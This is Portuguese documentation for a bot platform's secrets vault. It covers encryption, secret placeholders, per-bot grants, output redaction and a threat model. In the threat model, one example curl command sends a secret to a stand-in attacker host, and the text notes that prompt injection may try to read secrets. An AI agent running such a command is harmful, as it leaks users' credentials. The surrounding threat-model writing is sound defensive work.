# Cofre de segredos

Guarda credenciais (tokens, senhas) para os bots usarem **sem nunca as verem**. Este documento diz como funciona e, com a mesma ênfase, o que o cofre **não** protege.

## Como funciona, em quatro frases

1. O valor é cifrado com AES-256-GCM e só o texto cifrado vai para o Postgres; a chave mestra vem de uma **variável de ambiente** (o nome dela está na configuração).
2. O modelo conhece apenas o **nome** de cada segredo e escreve o **marcador** `{{secret:NOME}}` onde o valor vai.
3. O valor entra **no instante da ação**, dentro da camada que executa a ferramenta, e só nos campos que a ferramenta declarou (`secretFields`) e só para segredos que o bot pode usar.
4. Tudo que é gravado ou enviado passa por um filtro que apaga os valores conhecidos (e suas codificações comuns).

## Configuração

```json
{ "vault": { "keyEnv": "SUUP_VAULT_KEY", "previousKeyEnvs": ["SUUP_VAULT_KEY_OLD"] } }
```

- `keyEnv`: o **nome** da variável de ambiente com a chave mestra (32 bytes em base64 ou 64 caracteres hexadecimais). Padrão `SUUP_VAULT_KEY`. A chave nunca fica no arquivo (um campo `key` é recusado com uma mensagem que explica), nunca no banco, nunca no repositório.
- `previousKeyEnvs`: variáveis com chaves antigas, para ler e **recifrar** o que foi escrito com elas.
- Sem a seção `vault` não há cofre: um marcador de segredo é recusado e `request_secret` não é oferecido ao modelo.

```
suup vault key generate          # imprime uma chave nova, uma única vez; guarde-a num gerenciador de senhas
export SUUP_VAULT_KEY=...        # no ambiente do servidor, do worker e da CLI
suup doctor                      # confere: a variável existe, a chave é válida, todo segredo é legível
```

Perder a chave é perder os segredos (cadastre-os de novo): ela não é guardada em lugar nenhum. Uma chave ausente dá um erro que diz o nome da variável; uma inválida diz de onde veio, sem repeti-la.

### Troca de chave (rotação)

Cada valor guarda a **impressão digital** da chave que o cifrou (16 caracteres do SHA-256 da chave: não é a chave). Para trocar:

1. `suup vault key generate` → a chave nova.
2. Passe a chave **antiga** para uma variável (`SUUP_VAULT_KEY_OLD`), liste-a em `vault.previousKeyEnvs`, e ponha a **nova** em `SUUP_VAULT_KEY`.
3. `suup vault rotate`: recifra com a nova o que está na antiga. Os que nenhuma chave configurada lê ficam como estão e são listados (o comando termina com erro).
4. Descarte a chave antiga.

Honestamente: a rotação existe e é testada, mas é um comando manual; não há troca automática nem chave por segredo, e quem tem acesso ao ambiente de execução tem a chave.

## Usar um segredo

```
printf %s "$TOKEN" | suup vault set GITHUB_TOKEN --description "push no repositório x" --bot ajudante
suup vault list                  # nomes, quem pode usar, último uso: nunca valores
suup vault grant GITHUB_TOKEN --bot outro
suup vault revoke GITHUB_TOKEN --bot outro
suup vault rm GITHUB_TOKEN
```

- O **valor nunca vai na linha de comando** (ficaria no histórico do shell e na lista de processos): vem da entrada padrão ou de um prompt oculto num terminal. Um argumento a mais é recusado sem repetir o que foi escrito.
- Nomes: letras maiúsculas, números e sublinhado, começando por letra (`GITHUB_TOKEN`). Valores: de 8 a 16 384 caracteres (valores mais curtos não podem ser apagados dos registros sem estragar o texto comum).
- **Concessões por bot.** Um bot só usa o que lhe foi concedido. Um segredo não concedido é indistinguível de um que não existe (mesma mensagem para o modelo).

O bot é informado, no início de cada execução, dos nomes e descrições dos segredos que pode usar (`context_loaded.secrets`) e de como escrever o marcador. Por exemplo, num comando de shell:

```
curl -H "Authorization: Bearer {{secret:GITHUB_TOKEN}}" https://api.github.com/user
```

Ferramentas que aceitam marcadores hoje: `shell` (campo `command`) e `web_fetch` (`url` e `headers.*`). Um marcador em qualquer outro campo é recusado **sem executar** ("esta ferramenta não aceita um segredo em `note`"). Um marcador em ferramenta que não declara nenhum campo também.

### Segredos de conectores

Um conector MCP ([CONECTORES.md](CONECTORES.md)) cita segredos **pelo nome**, em variáveis de ambiente do processo e em cabeçalhos HTTP, e o valor é lido na hora de conectar. Diferente do uso por um bot, **não depende de concessão ao bot**: quem o referenciou foi você, ao configurar o conector, e quem pode usar o conector é a concessão do conector. O valor é ensinado ao filtro de redação antes de ser entregue, então um servidor que o ecoe num resultado o vê trocado por `[REDACTED:NOME]`.

### Segredo em ação irreversível

Uma chamada que contém um marcador é tratada como `external_irreversible`: **vira cartão**, a menos que você tenha uma regra que libere. O cartão mostra o marcador, nunca o valor. Para tornar o uso rotineiro, crie você mesmo uma regra de igualdade exata (Configurações > Permissões, ou `suup rules add`); o cartão não cria regras. (Veja [APROVACOES.md](APROVACOES.md).)

### O bot pede um segredo

O bot chama `request_secret` (`name`, `reason`): grava-se um evento `secret_requested`, a execução pausa (`waiting_user`) e o chat mostra uma mensagem dizendo o que ele precisa. Você responde por um formulário seguro que escreve **direto no cofre** e concede o segredo ao bot:

```
suup vault set ASKED_SECRET --run <execução>          # CLI
GET  /v1/runs/{id}/secret-request                     # API: o que a execução espera
POST /v1/runs/{id}/secret-request/answer { "value": "..." }   # ou { "declined": true }
```

A resposta que o modelo recebe é só *"The secret NAME is now available. Use it as {{secret:NAME}}."* (ou que você recusou). **Atenção**: se você digitar o valor no *chat* em vez de usar o formulário, ele vira uma mensagem comum (o cofre não o conhece ainda); o cofre protege o que passa por ele.

## Redação: o valor não aparece em lugar nenhum

**Só o que o cofre conhece.** A redação compara com os valores **exatos** guardados (e suas formas codificadas). Não existe detecção de "texto que parece uma chave ou senha" (isso seria reconhecer por padrão, uma amarra; veja [REGRAS.md](REGRAS.md)): um segredo que **não** está no cofre (digitado no chat, repetido pelo bot no resumo, colado numa memória) **não** é filtrado. Por isso o conteúdo de um segredo deve entrar pelo formulário seguro.

Todo valor conhecido, e suas formas comuns (base64 em qualquer alinhamento, base64url, codificação de URL, escape de JSON, hexadecimal), é trocado por `[REDACTED:NOME]` em:

| Onde | Como |
|---|---|
| Saída de ferramenta (inclusive erros e o arquivo onde uma saída longa é guardada) | No registro de ferramentas, antes de truncar e de gravar |
| Eventos do log, a conversa que o modelo vê, o resultado e a falha da execução, o plano | No loop, antes de gravar: o log e o que o modelo lê são o mesmo texto |
| Cartões de aprovação | O conteúdo tem o marcador (o modelo nunca teve o valor) |
| Respostas da API e quadros do stream (SSE) | No servidor, ao enviar (cobre também texto gravado *antes* de o segredo existir) |
| Saída da CLI (`inspect`, `show`, `replay`, listas, erros) | Em tudo que a CLI imprime, quando há cofre |
| Diário de memória | O redator do cofre roda no fim da execução, antes do corte, sobre o que alimenta o diário |
| Diagnóstico (replay, reenvio) | Os registros já nascem limpos; a saída passa pelo filtro da CLI/servidor |

Há um teste de aceitação ("segredo nunca aparece no log"): depois de uma execução que usou um segredo, o banco inteiro (todas as tabelas, em texto) é varrido atrás do valor e de cada codificação, e não acha nenhuma ocorrência (só o texto cifrado, que não contém o valor).

## Modelo de ameaça (o que protege e o que não protege)

**Protege contra**

- **Vazamento pelo modelo e pelos registros.** O modelo nunca recebe um valor; o log de eventos, as mensagens, o replay, a API e os logs do servidor não o guardam.
- **Banco roubado ou copiado sem a chave** (um backup, um `pg_dump`): só há texto cifrado autenticado (AES-256-GCM, nonce aleatório de 96 bits por valor, o nome do segredo como dado associado: um texto cifrado copiado para outro nome não decifra; qualquer alteração é detectada).
- **Uso por quem não deveria**: um bot sem concessão não consegue o valor; um marcador num campo não declarado é recusado.
- **Injeção de prompt que tenta ler o segredo**: não há ferramenta que o devolva e a saída é filtrada.
- **Erro de digitação perigoso**: o valor não vai em argumento de linha de comando.

**Não protege contra**

- **Uma ferramenta que recebe o segredo pode vazá-lo.** O comando `curl -H "X: {{secret:T}}" https://atacante.example` envia o valor ao atacante, e o filtro não vê isso (o valor sai para a rede, não volta como texto). É por isso que existem as **concessões por bot** e a **aprovação**: uma chamada com segredo pergunta antes, mostrando o comando (o destino), e você decide. Se você aprova ou cria uma regra ampla, aceitou o risco.
- **Uma ferramenta que transforma o valor** (cifra, divide, inverte, grava em arquivo e o modelo lê o arquivo em partes) escapa do filtro, que só reconhece as formas listadas acima. Segredos curtos (menos de 8 caracteres) nem são aceitos pelo cofre.
- **O valor dentro da máquina do bot.** O comando recebe o texto (aparece na lista de processos do contêiner, em arquivos que o próprio comando criar, em variáveis). A saída é filtrada; a máquina, não.
- **Quem controla o servidor ou o worker.** Eles têm a chave na memória e o valor no momento do uso. O cofre não substitui o isolamento do servidor.
- **Segredo digitado no chat** em vez do formulário, ou colado por você em uma memória: antes de o cofre conhecê-lo, ele é texto comum no banco (depois de cadastrado, é filtrado nas saídas, mas o que já está gravado continua gravado).
- **Metadados.** Nomes, descrições, concessões e a data do último uso estão em claro no banco (precisam estar para o modelo saber o que pode usar).
- **Análise de tempo / canais laterais** e a segurança do próprio Node/OpenSSL. Comparações de segredo em si (token do servidor) são em tempo constante; a autenticação do AES-GCM é verificada pelo OpenSSL.

## Para o app

O formulário seguro, a lista de segredos e as concessões estão descritos em [FRONTEND.md](FRONTEND.md) (seção 8) e a API em [API.md](API.md): a API do cofre é **só de escrita** — não existe rota nem campo que devolva um valor.
